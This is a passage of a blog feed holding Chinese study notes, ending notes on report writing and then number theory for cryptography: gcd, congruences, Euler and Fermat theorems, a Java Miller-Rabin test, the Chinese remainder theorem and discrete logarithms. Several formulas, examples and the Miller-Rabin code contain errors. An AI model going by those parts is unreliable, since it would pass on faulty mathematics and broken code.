id="基本类型">基本类型</h3><ol><li>桌面调研和实地调研（问卷式、访问式、观察式）</li><li>内部因素调研（产品、价格……）和外部环境调研（企业宏观环境和企业微观环境）</li><li>全面调研和非全面调研</li></ol><h3 id="调研步骤">调研步骤</h3><ol><li>确定调研目标</li><li>界定调研问题<ol><li>顾客态度、改进意见</li><li>竞争对手特点</li><li>顾客接受的价格范围</li></ol></li><li>调研执行</li><li>调研分析</li></ol><h3 id="正文的前言">正文的前言</h3><p>（概述写法）</p><ol><li>开门见山，揭示主题</li><li>结论先行，逐步论证</li><li>交代背景，逐层分析，得出结论</li><li>提出问题，引入正题</li></ol><h3 id="正文的情况部分">正文的情况部分</h3><ol><li>提出问题（现状、情况）</li><li>分析问题（原因、做法经验）</li><li>解决问题（建议、办法、对策）</li></ol><p>描述方式：叙述（概述）、说明、议论</p><h2 id="日常事务文书">日常事务文书</h2><p>概念：汇总+结论</p><h3 id="内容构成">内容构成</h3><ol><li>过程概述</li><li>成绩归纳</li><li>经验提炼</li><li>问题分析</li></ol><h3 id="结构">结构</h3><ol><li>标题（准确简洁）<ul><li>公文式标题</li><li>文章式标题</li><li>双标题</li></ul></li><li>正文<ul><li>前言<ul><li>概括式（交代情况）</li><li>结论式</li></ul></li><li>主体<ul><li>纵式结构（做了什么/成绩/经验问题）</li><li>横式结构（经验体系）</li></ul></li><li>结论（总结经验）</li></ul></li><li>落款：署名+日期</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用文写作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全技术数学基础</title>
      <link href="/posts/215ef6b6.html"/>
      <url>/posts/215ef6b6.html</url>
      
        <content type="html"><![CDATA[<h2 id="数论">数论</h2><h3 id="因子">因子</h3><ul><li><h4 id="因子（定义）">因子（定义）</h4>  <div class="note info simple"><p>设$a, b ∈ Z$，$a ≠ 0$，$c ∈ Z$，使得$b = ac$，则称$a$整除$b$，并称$a$是$b$的<strong>因子</strong>或者<strong>约数</strong>，$b$是$a$的<strong>倍数</strong>，记为$a | b$。</p></div><p>如果整数$a$除整数$b$得到的商$c$是整数，那么称$a$是$b$的因子/约数，$b$是$a$的倍数，记为$a | b$​。</p><p>有如下性质：</p><ul><li>$a|a$</li><li>如果$a|b$，$b|c$，那么$a|c$成立</li><li>如果$a|c$，那么$ab|cb$​成立</li><li>如果$a|b$，$a|c$，那么对于任意整数x、y，$a|(bx+cy)$​成立</li><li>如果$a|b$，$b|a$，那么$a=\pm b$</li></ul></li><li><h4 id="带余除法（定理）">带余除法（定理）</h4>  <div class="note info simple"><p>设$a, b ∈ Z$，$b ≥ 1$，则存在唯一的整数$q$和$r$，使得$a = qb + r$，$0 ≤ r &lt; b$。$q$称$a$除以$b$所得的商，$r$称为$a$除以$b$所得的<strong>最小非负剩余</strong>。</p></div><p>$a$为整数，$b$为正整数，那么$a = qb + r$可以确定唯一的$q$（商）和$r$（最小非负剩余，一定小于$b$）。</p></li><li><h4 id="最大公因子（定义）">最大公因子（定义）</h4>  <div class="note info simple"><p>设$a, b ∈ Z$，$a,b$不全为0，如果$c | a$且$c | b$，则称$c$为$a$和$b$的公因子。特别地，我们把$a$和$b$的所有公因子中最大的，称为$a$和$b$的<strong>最大公因子</strong>，记为$gcd(a,b)$ 或者 (<em>a</em>, <em>b</em>)。</p></div><p>如果$c$为不都为0的整数$a$、$b$的因子，那么$c$为$a$、$b$的公因子，其中最大公因子记作$gcd(a,b)$或$(a,b)$​。</p></li><li><h4 id="欧几里得算法（定理）">欧几里得算法（定理）</h4>  <div class="note info simple"><p>给定整数$a$和$b$，且$b&gt;0$，重复使用带余除法，即每次的余数为除数去除上一次的除数，直到余数为0，这样可以得到下面一组方程：</p><p>​$a = bq_1+r_1$，$0 &lt; r_1 &lt;b$</p><p>​$b = r_1q_2+r_2$，$0 &lt; r_2 &lt; r_1$</p><p>​$r_1 = r_2q_3+r_3$，$0 &lt; r_3 &lt; r_2$</p><p>​……</p><p>​$r_{j-1} = r_jq_{j+1}$</p><p>最后一个不为0的余数$r_j$​就是$a$和$b$的最大公因子</p></div><p>欧几里得算法求$gcd(a,b)$：第一次将两数作为$a$和$b$进行带余除法（$a = qb + r$），在下一次带余除法计算时$b$作为$a$，余数$r$作为$b$，多次计算直到余数为0的$r_j$即最大公因子。</p>  <details class="folding-tag" ><summary> 求$gcd(1970，1066)$ </summary>              <div class='content'>              <p>求$gcd(1970,1066)$：</p><p>$1970 ＝ 1 × 1066 + 904$</p><p>$1066 ＝ 1 × 904 + 162$</p><p>$904 ＝ 5 × 162 + 94$</p><p>$162 = 1 × 94 + 68$</p><p>$94 ＝ 1 × 68 + 26$</p><p>$68 ＝ 2 × 26 + 16$</p><p>$26 ＝ 1 × 16 + 10$</p><p>$16 = 1 × 10 + 6$</p><p>$10 = 1 × 6 + 4$</p><p>$6 = 1 × 4 + 2$</p><p>$4 = 2 × 2 + 0$</p><p>因此$gcd (1970,1066) = 2$</p>              </div>            </details><ul><li><p>推导定理</p>  <div class="note info simple"><p>对任何非负整数$a$和正整数$b$，有$gcd(a,b)=gcd(b, a\bmod b)$。</p></div></li></ul></li></ul><h3 id="素数">素数</h3><ul><li><h4 id="素数（定义）">素数（定义）</h4>  <div class="note info simple"><p>设$p ∈Z$，$p≥2$，如果$p$的正因子只有1和$p$，则称$p$为<strong>素数</strong>，否则为<strong>合数</strong></p></div><p>素数的因子只有1和其本身。</p><p>性质：</p><ul><li>数字越大的区间素数分布越稀疏，对于每个大于等于2的整数$n$，连续$n-1$个整数$n!+2$，$n!+3$，$\dots$，$n!+n$都不是素数</li><li>任意两个相邻的正整数$n$和$n+1$（$n&gt;3$​）中必有一个不是素数</li><li>$n$和$n+2$均为素数的数对称为孪生素数，例如$(3,5)$，$(5,7)$，$(11,13)$，$(29,31)$。</li></ul></li><li><h4 id="素因子（定义）">素因子（定义）</h4>  <div class="note info simple"><p>若正整数$a$有一因子$b$，而$b$又是素数，则称$b$为$a$的<strong>素因子</strong></p></div><p>数的因子也是素数，那么该因子成为素因子。</p><ul><li><p>推导定理</p>  <div class="note info simple"><p>若$a$是大于1的整数，则$a$的大于1的最小因子一定是素数。</p></div><p>本定理说明了任何大于1的整数均可被一素数整除，或者说都至少有一素因子。</p></li><li><p>性质：</p><ul><li>如果$p$是素数，且$p|ab$，则$p|a$或$p|b$</li><li>对于任意大于1的整数$m$，都有唯一分解式：$m=p_{1}^{a_1}p_{2}^{a_2}\dots p_{n}^{a_k}$，其中$p_1$，$p_2$，$\dots$，$p_n$均为素数，$p_i&gt;p_j(i&lt;j)$，且$a_i$​都是正整数</li><li>素数个数有无穷多个</li></ul></li><li><p>素数定理：</p>  <div class="note info simple"><p>设$\pi(x)$表示不大于$x$的素数的数目，则$\lim_{x \to \infty}\frac{\pi(x)\ln x}{x}=1 $。</p></div><p>素数定理表明，对充分大的$x$，$\pi(x)$可用$\frac{x}{\ln x}$近似表示</p></li></ul></li><li><h4 id="互素（定义）">互素（定义）</h4>  <div class="note info simple"><p>如果整数$a$与整数$b$的最大公因子是1，即$gcd (a, b) = 1$​，则称$a$与$b$​​互为素数，简称<strong>互素</strong></p></div><p>互素的正整数中不一定有素数，例如$gcd(25,36)=1$，但25和36均为合数。</p></li><li><h4 id="欧拉函数（定义）">欧拉函数（定义）</h4>  <div class="note info simple"><p>设$\varphi (m)$为小于或等于$m$且与$m$​互素的正整数个数，则称其为<strong>欧拉(Euler)函数</strong></p></div>  <details class="folding-tag" ><summary> 欧拉函数举例 </summary>              <div class='content'>              <p>$\varphi(1)=1$：1​</p><p>$\varphi(2)=1$：1</p><p>$\varphi(3)=2$：1、2</p><p>$\varphi(5)=4$：1、2、3、4</p><p>$\varphi(8)=4$：1、3、5、7</p>              </div>            </details></li></ul><h3 id="同余">同余</h3><blockquote><p>用$Z_m$表示正整数{$0,1,\dots,m-1$}的集合</p></blockquote><ul><li><h4 id="模数（定义）">模数（定义）</h4>  <div class="note info simple"><p>两个整数$a$, $b$分别被$m$除，如果所得的余数相同，则称$a$与$b$对模$m$是<strong>同余</strong>的，记为$a\equiv b(\bmod m)$，正整数$m$​称为<strong>模数</strong>。</p></div><p>性质：</p><ul><li>$a\equiv b(\bmod m) \Leftrightarrow m|(b-a)$</li><li>如果$a=km+b$（k为整数），则$a\equiv b(\bmod m)$</li><li><span class='nota' data-nota='说人话：任意数对m取余一定在0~m-1之间'>每个整数恰与0，1，…，$m-1$这$m$个整数中的某一个对模$m$​同余</span></li><li>同余关系是一种等价关系</li><li>$a\equiv b(\bmod m)$当且仅当$a \bmod m = b \bmod m$</li></ul><p>同余式性质：</p><p>（若$a\equiv b(\bmod m)$，$c\equiv d(\bmod m)$）</p><ul><li>同余式可加：$ax+cy\equiv bx+dy(\bmod m)$</li><li>同余式可乘：$ac\equiv bd(\bmod m)$</li><li>$an\equiv bn(\bmod m)$，$n&gt;0$</li><li>$f(a)\equiv f(b)(\bmod m)$，$f(x)$为任意一个整系数多项式</li></ul><p>（若$a$，$b$，$c$，$d$为整数，$m$为正整数）</p><ul><li><span class='nota' data-nota='将m换为其因子同余式也成立'>若$a\equiv b(\bmod m)$，且$d|m$，则$a\equiv b(\bmod d)$​</span></li><li>若$a\equiv b(\bmod m)$，则$gcd(a,m)=gcd(b,m)$</li></ul></li><li><h4 id="乘法消去律（定理）">乘法消去律（定理）</h4>  <div class="note info simple"><p>对于$ab\equiv ac(\bmod m)$来说，若$gcd(a,m)=1$，则$b\equiv c(\bmod m)$​。</p></div><p>对于$ab\equiv ac(\bmod m)$，若$a$、$m$互素，则可直接消去$a$。</p></li><li><h4 id="加法消去律（定理）">加法消去律（定理）</h4>  <div class="note info simple"><p>如果$a+b\equiv a+c(\bmod m)$，则$b\equiv c(\bmod m)$。​​</p></div></li><li><h4 id="剩余类-同余类（定义）">剩余类/同余类（定义）</h4>  <div class="note info simple"><p>由于模$m$同余关系是一个等价关系，若将$Z$中的同余的树归为一类，不同余的数归为不同的类，则将$Z$分为$m$个类，称为模$m$​的剩余类或同余类。</p></div><p>按照$Z$对$m$取模的余数将数划分为不同的类，称为剩余类（同余类）。</p><p>使用$[r]$表示$r$所属的模$m$的剩余类（$r \bmod m$​）</p></li><li><h4 id="非负最小完全剩余系（定义）">非负最小完全剩余系（定义）</h4>  <div class="note info simple"><p>在模$m$剩余类$[0],[1],\dots,[m-1]$中各取一数$a_0,a_1,\dots,a_{m-1}$，该m个数$a_0,a_1,\dots,a_{m-1}$称为模$m$的一个完全剩余系，将{$0,1,\dots,m-1$}记为$Z_m$，称为模$m$​的非负最小完全剩余系。</p></div></li><li><h4 id="简化剩余系（定义）">简化剩余系（定义）</h4>  <div class="note info simple"><p>若模$m$剩余类中的数与$m$互素，称它为与模$m$互素的剩余类，在与模$m$互素的所有剩余类中各取一数所组成的集合，称为模$m$的一个简化剩余系，$Z_m$的简化剩余系记为$Z^{*}_{m}$​。</p></div></li><li><h4 id="一次同余方程（定义）">一次同余方程（定义）</h4>  <div class="note info simple"><p>若$a$、$b$都是整数，且$m$不能整除$a$，则称$ax\equiv b(\bmod m)$为模$m$​的一次同余方程。</p></div><p>若$x_0$满足$ax_0\equiv b(\bmod m)$，则$x\equiv x_0(\bmod m)$称为它的解，其全部解可以表示为$x_0+mk, k=0,\pm 1, \pm2, \dots$。（不同解指的是互不同余的解）</p></li><li><h4 id="一次同余方程有唯一解（定理）">一次同余方程有唯一解（定理）</h4>  <div class="note info simple"><p>设$a\in Z_m$，对于任意的$b\in Z_m$，同余方程$ax\equiv b(\bmod m)$有唯一解$x\in Z_m$的充分必要条件是$gcd(a,m)=1$</p></div></li><li><h4 id="一次同余方程有解（定理）">一次同余方程有解（定理）</h4>  <div class="note info simple"><p>设$gcd(a,m)=d,m\gt 0$，则$ax\equiv b(\bmod m)$有解，当且仅当$d|b$​</p></div></li></ul><h3 id="模运算">模运算</h3><ul><li><h4 id="性质">性质</h4><ol><li>$(a\pm b) \bmod m = [(a \bmod m)\pm (b\bmod m)] \bmod m$</li><li>$(a\times b) \bmod m = [(a \bmod m)\times (b\bmod m)] \bmod m$</li><li>$[a\times (b + c)] \bmod m = [(a\times b) \bmod m+ (b\times c)\bmod m] \bmod m$</li></ol></li><li><h4 id="加法逆元（定义）">加法逆元（定义）</h4>  <div class="note info simple"><p>对$a\in Z_m$，存在$b\in Z_m$，使得$a+b\equiv 0(\bmod m)$，则$b$是$a$的加法逆元，记$b=-a$​。</p></div><p>加法一定存在逆元。</p></li><li><h4 id="乘法逆元（定义）">乘法逆元（定义）</h4>  <div class="note info simple"><p>对$a\in Z_m$，存在$b\in Z_m$，使得$a\times b\equiv 1(\bmod m)$，则称$b$是$a$​的乘法逆元。</p></div><p>乘法不一定存在逆元。</p><p>在密码学特别是非对称密码体制中，常常需要求模逆元，求模逆元就是求乘法逆元。即寻找一个$x$，使得$a \times x \equiv 1 \bmod m$成立。模逆元不一定存在结果，通常试用欧几里得算法求出。</p><blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20240225163951178.png" alt="模8运算"></p><ul><li>对应每个$x$都有一个对应的$y$使得$x+y\equiv 0 \bmod 8$，则$y$是$x$的加法逆元。如对2，存在加法逆元6使得$2+6\equiv 0 \bmod 8$​。</li><li>对应$x$存在$y$使得$x\times y\equiv 1\bmod 8$，则$y$是$x$的乘法逆元。如对3，存在乘法逆元3使得$3\times 3\equiv 1\bmod 8$。</li></ul></blockquote></li><li><h4 id="快速指数模运算">快速指数模运算</h4><p>求$m^e\bmod n$的方法</p><ul><li><p>常规算法</p><p>原理：模运算性质$(a\times b) \bmod m = [(a \bmod m)\times (b\bmod m)] \bmod m$​</p><p>变换：$a^e\bmod m = [(a \bmod m)^e]\bmod m$​</p></li><li><p>快速求法</p>  <div class="note info simple"><ol><li>$a\gets e$，$b\gets m$，$c\gets 1$， 其中$a$，$b$，$c$为三大整数寄存器。</li><li>如果$a=0$，则输出结果$c$即为所求的模<em>n</em>的大整数次幂。</li><li>如果$a$是奇数，转第5步。</li><li>$a\gets \frac{a}{2}$，$b\gets b\times b\bmod n$，转第3步。</li><li>$a\gets (a-1)$，$c\gets (c\times b) \bmod n$​，转第2步。</li></ol></div>  <details class="folding-tag" ><summary> 计算$30^{37}\bmod 77$​​ </summary>              <div class='content'>              <table><thead><tr><th style="text-align:center">a</th><th style="text-align:center">b</th><th style="text-align:center">e</th></tr></thead><tbody><tr><td style="text-align:center">37</td><td style="text-align:center">30</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">36</td><td style="text-align:center">与前一次值相同</td><td style="text-align:center">$(30\times 1)\bmod 77=30$</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center">$(30\times 30)\bmod 77=53$</td><td style="text-align:center">与前一次值相同</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">$(53\times 53)\bmod 77=37$</td><td style="text-align:center">与前一次值相同</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">与前一次值相同</td><td style="text-align:center">$(37\times 30)\bmod 77=32$</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">$(37\times 37)\bmod 77=60$</td><td style="text-align:center">与前一次值相同</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">$(60\times 60)\bmod 77=58$</td><td style="text-align:center">与前一次值相同</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">$(58\times 58)\bmod 77=53$</td><td style="text-align:center">与前一次值相同</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">与前一次值相同</td><td style="text-align:center">$(53\times 32)\bmod 77=2$</td></tr></tbody></table><p>得$c=2$，即$30^{37}\bmod 77=2$</p>              </div>            </details></li></ul></li></ul><h3 id="费马定理和欧拉定理">费马定理和欧拉定理</h3><ul><li><h4 id="费马定理（定理）">费马定理（定理）</h4>  <div class="note info simple"><p>若$p$是素数，且$a$是正整数，且$gcd(a,p)=1$，则$a^{p-1}\equiv 1(\bmod p)$。</p></div>  <details class="folding-tag" ><summary> 例$a=7，p=19$ </summary>              <div class='content'>              <p>$a=7,p=19,gcd(a,p)=1$</p><p>$7^2=49\equiv 11\bmod 19$</p><p>$7^4\equiv 121\bmod 19\equiv 7\bmod 19$</p><p>$7^8\equiv49\bmod 19\equiv 11\bmod 19$</p><p>$7^{16}\equiv 121\bmod 19 \equiv 7 \bmod 19$</p><p>$a^{p-1}=7^{18}=7^{16}\times 7^2\equiv 7\times 11\bmod 19\equiv 1\bmod 19$</p>              </div>            </details><p>推论（费马定理另一种总表现形式）：</p>  <div class="note info simple"><p>设$p$是素数，对于任意正整数$a$，则$a^p\equiv a(\bmod p)$。</p></div><p>推论不要求$gcd(a,p)=1$，即$a,p$​互素</p></li><li><h4 id="欧拉定理（定理）">欧拉定理（定理）</h4>  <div class="note info simple"><p>对于任意互素的两个整数$a,n$，有：$a^{\varphi (n)}\equiv 1\bmod m$​。</p></div>  <details class="folding-tag" ><summary> 欧拉定理举例 </summary>              <div class='content'>              <p>$a=3,n=10$：$\varphi (10)=4,a^{\varphi(n)}=3^4=81\equiv 1\bmod 10=1\bmod n$</p><p>$a=2,n=11$：$\varphi(11)=10,a^{\varphi (n)}=3^{10}=1024\equiv1\bmod 11=1\bmod n$</p>              </div>            </details><p>对于欧拉定理，有：</p><ul><li>当$n=p$时，有$a^{p-1}\equiv 1\bmod p$，为费马定理</li><li>易见$a^{\varphi (n+1)}\equiv a\bmod n$（欧拉定理的另一种形式不要求$a$和$n$互素）</li></ul>  <details class="folding-tag" ><summary> 求$13^{2001}$被$60$除所得的余数 </summary>              <div class='content'>              <p>$\because gcd(13,60)=1$</p><p>$\therefore 13^{\varphi (60)}\equiv 1(\bmod 60)$</p><p>$\because \varphi (60)=\varphi (2^2\times 3\times 5)=2\times(3-1)\times(5-1)=16$，$2001=125\times 16+1$</p><p>$\therefore 13^{16}\equiv 1(\bmod 60)$，$13^{2001}=(13^{16})^{125}\times 13\equiv 13(\bmod 60)$</p><p>即被60除所得的余数为13</p>              </div>            </details></li></ul><h3 id="素性测试">素性测试</h3><p>素性测试即检验一个大数是否为素数，通常用于密码算法中需要大素数时判断随机生成的数是否为素数。</p><div class="note info simple"><p>如果$p$为大于2的素数，则方程$x^2\equiv 1(\bmod p)$的解只有$x=1$和$x=-1$​。</p></div><p>定理的逆否命题为：如果方程$x^2\equiv 1(\bmod p)$有一个解$x_0\notin$ {$-1,1$}，那么p不是素数。</p><details class="folding-tag" ><summary> Miller-Rabin素性概率检验算法 </summary>              <div class='content'>              <p><img src="https://oss.iuoyt.com/img/posts/image-20240302194925787.png" alt="Miller-Rabin素性概率检验算法"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MillerRabinTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">WITNESS</span><span class="params">(BigInteger a, BigInteger n)</span> &#123;</span><br><span class="line">        <span class="comment">// 计算 n-1</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">nMinusOne</span> <span class="operator">=</span> n.subtract(BigInteger.ONE);</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">d</span> <span class="operator">=</span> BigInteger.ONE;</span><br><span class="line">        <span class="comment">// 将 (n-1) 表示为二进制形式 b_k b_&#123;k-1&#125; ... b_0</span></span><br><span class="line">        <span class="keyword">while</span> (d.mod(BigInteger.valueOf(<span class="number">2</span>)).equals(BigInteger.ZERO)) &#123;</span><br><span class="line">            k++;</span><br><span class="line">            d = d.divide(BigInteger.valueOf(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环处理</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// x←d</span></span><br><span class="line">            <span class="type">BigInteger</span> <span class="variable">x</span> <span class="operator">=</span> d;</span><br><span class="line">            <span class="comment">// d←d^2 mod n</span></span><br><span class="line">            d = d.multiply(d).mod(n);</span><br><span class="line">            <span class="comment">// 如果 d=1 且 x≠1 且 x≠n-1，则 n 可能是合数</span></span><br><span class="line">            <span class="keyword">if</span> (d.equals(BigInteger.ONE) &amp;&amp; !x.equals(BigInteger.ONE) &amp;&amp; !x.equals(nMinusOne)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果 b_i=1，则 d←d*a mod n</span></span><br><span class="line">            <span class="keyword">if</span> (nMinusOne.testBit(i)) &#123;</span><br><span class="line">                d = d.multiply(a).mod(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后检查d是否等于1，如果d≠1，则n可能是合数，否则n可能是素数</span></span><br><span class="line">        <span class="keyword">return</span> !d.equals(BigInteger.ONE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 小于n的整数</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="comment">// 要检验的数</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">n</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;7919&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (WITNESS(a, n)) &#123;</span><br><span class="line">            System.out.println(n + <span class="string">&quot; 可能是合数&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(n + <span class="string">&quot; 可能是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>算法有两个输入，$n$是待检验的数，$a$是小于<em>n</em>的整数。如果算法的返回值为TRUE，则$n$肯定不是素数，如果返回值为FALSE，则$n$有可能是素数。</p></li><li><p>for循环后，有$d = a^{n-1}\bmod n$，由费马定理可知，若$n$为素数，则$d$为1，因此若$d\ne 1$，则$n$不是素数，所以返回TRUE。</p></li><li><p>因为$n-1\equiv -1\bmod n$，所以$x\ne 1$，$x\ne n-1$，表示$x^2\equiv 1 (\bmod p)$有不在{$-1,1$}中的根，因此$n$不为素数，返回TRUE。</p></li></ul>              </div>            </details><h3 id="中国剩余定理">中国剩余定理</h3><div class="note info simple"><p>设$m_1,m_2,\dots ,m_k$​是两两互素的正整数，令</p><center>$M=m_1m_2\dots m_k=m_1M_1=m_2M_2=\dots=m_kM_k$</center><p>上式中$M_i=\frac{M}{m_i},i=1,2\dots,k$，则同时满足同余方程组</p><center>$x\equiv b_i\bmod m_i\quad(i=1,2,\dots,k)$</center><p>的唯一正整数解$x_0$是：</p><center>$x_0=(b_1M^{\prime}_{1}M_1+b_2M^{\prime}_{2}M_2+\dots+b_kM^{\prime}_{k}M_k)\bmod M$</center><p>上式中$M^{\prime}_{i}$是$M_i$以$m_i$为模的逆元。</p></div><details class="folding-tag" ><summary> 求解$x$举例 </summary>              <div class='content'>              <blockquote><p>求解满足以下方程的解$x$：</p><center>$x\equiv 1\bmod 2$​</center><center>$x\equiv 2\bmod 3$</center><center>$x\equiv 3\bmod 5$</center><center>$x\equiv 5\bmod 7$</center></blockquote><p>$M=m_1m_2m_3m_4=2\times 3\times 5\times 7=210$</p><p>$M_1=105,M_2=70,M_3=42,M_4=30$</p><p>由扩展欧几里得定理：</p><center>$M^{-1}_{1}\bmod 2\equiv 1\quad M^{-1}_{2}\bmod 3\equiv 1\quad M^{-1}_3\bmod 5\equiv 3\quad M^{-1}_4\bmod 7\equiv 4$</center>​<p>$\therefore x\bmod 210\equiv(1\times 105\times 1+ 2\times 70\times 1+3\times 42\times 3+5\times 30\times 4)\bmod 210\equiv 173$</p><p>即$x\equiv 173\bmod 210$</p>              </div>            </details><h3 id="离散对数">离散对数</h3><ul><li><h4 id="本原根（定义）">本原根（定义）</h4>  <div class="note info simple"><p>若$Ord_na=\varphi (n)$，则称$a$是模$n$​的本原根，也称生成元。</p><blockquote><p>指数：假设$gcd(a,n)-1$，如果使$m$是使$a^m\equiv 1\bmod n$成立的最小正整数，则称它是$a$对模$n$的指数，记为$Ord_na$。</p></blockquote></div><p>并非所有的整数都有本原根。模$m$的本原根存在的必要条件是$m=2,4,p^a$或$2p^a$，此处$p$为奇素数。</p>  <details class="folding-tag" ><summary> 求模7和模15的本原根 </summary>              <div class='content'>              <ol><li><p>对于模7：满足$gcd(a,n)=1$的$a$是{$1,2,3,4,5,6$}，指数表如下：</p><table><thead><tr><th style="text-align:center">$a$</th><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">6</th></tr></thead><tbody><tr><td style="text-align:center">$Ord_7a$</td><td style="text-align:center">1</td><td style="text-align:center">3</td><td style="text-align:center">6</td><td style="text-align:center">3</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr></tbody></table><p>当$a=3$或$5$时，$Ord_7a=\varphi (7)$，因此3和5是模7的本原根。</p></li><li><p>对于模15：满足$gcd(a,n)=1$的$a$是{$1,2,4,7,8,11,13,14$}​，指数表如下：</p><table><thead><tr><th style="text-align:center">$a$</th><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">4</th><th style="text-align:center">7</th><th style="text-align:center">8</th><th style="text-align:center">11</th><th style="text-align:center">13</th><th style="text-align:center">14</th></tr></thead><tbody><tr><td style="text-align:center">$Ord_{15}a$</td><td style="text-align:center">1</td><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr></tbody></table><p>从上表中可以看出不存在$a$使得$Ord_{15}a=\varphi (15)$，所以模15没有本原根。</p></li></ol>              </div>            </details></li><li><h4 id="简化剩余系（定理）">简化剩余系（定理）</h4>  <div class="note info simple"><p>若$a$是模$n$的本原根，则$1,a^1,a^2,\dots,a^{\varphi (n)}$构成模$n$​的简化剩余系。</p></div></li><li><h4 id="本原根的测试">本原根的测试</h4>  <div class="note info simple"><p>令$q_1,q_2,\dots,q_n$是$p-1$的素因子，对于所有的$q_1,q_2,\dots,q_n$计算$a^{\frac{p-1}{q}}(\bmod p)$，如果对于某个$q$的某个值其结果为1，那么$a$不是一个本原根。如果对于某个$q$的所有值其结果都不为1，那么$a$​是一个本原根。</p></div>  <details class="folding-tag" ><summary> 假设$p=11$​，检验2和3是否是一个本原根 </summary>              <div class='content'>              <p>当$p=11$时，$p-1=10$，$p-1$有两个素因子2和5</p><ol><li><p>对2判断：</p> <center>$2^{\frac{10-1}{5}}(\bmod 11)=4$</center> <center>$2^{\frac{10-1}{2}}(\bmod 11)=10$</center><p>由于计算结果没有1，故2是本原根。</p></li><li><p>对3判断：</p> <center>$3^{\frac{10-1}{5}}(\bmod 11)=9$</center> <center>$3^{\frac{10-1}{2}}(\bmod 11)=1$</center><p>由于计算结果存在1，故3不是本原根。</p></li></ol>              </div>            </details></li><li><h4 id="离散对数-2">离散对数</h4><p>模运算用于指数计算可以表示为$a^x\bmod n$，称为模指数运算，其逆向问题就是找出一个数的离散对数，即求解$x$，使得：$a^x\equiv b\bmod n$。</p>  <div class="note info simple"><p>对于一个整数$b$和素数$n$的一个本原根$a$，可以找到唯一的指数$x$，使得$b\equiv a^x\bmod n$，其中$0\le x\le n-1$，指数$x$称为$b$的以$a$为基数的模$n$​​的离散对数。</p></div><p>并非所有离散对数都有解。</p><blockquote><p>例如取$n=11$​，有3个本原根2、6、8</p><ol><li><p>求模数：</p><p>当$a=2,x=9$可求出模数$b=6$</p><p>当$a=5,x=7$可求出模数$b=8$</p><p>当$a=8,x=4$可求出模数$b=4$​</p></li><li><p>求离散对数：</p><p>当$a=2,b=3$可求出离散对数$x=8$</p><p>当$a=6,b=5$可求出离散对数$x=6$</p><p>当$a=8,b=10$可求出离散对数$x=5$</p></li></ol></blockquote></li></ul><h3 id="二次剩余">二次剩余</h3><ul><li><p>定义</p>  <div class="note info simple"><p>如果$gcd(a,m)=1$，并且$2^x\equiv a(\bmod m)$有解，则称$a$是$m$的二次剩余（平方剩余），否则称$a$是$m$非二次剩余。满足$x^2\equiv 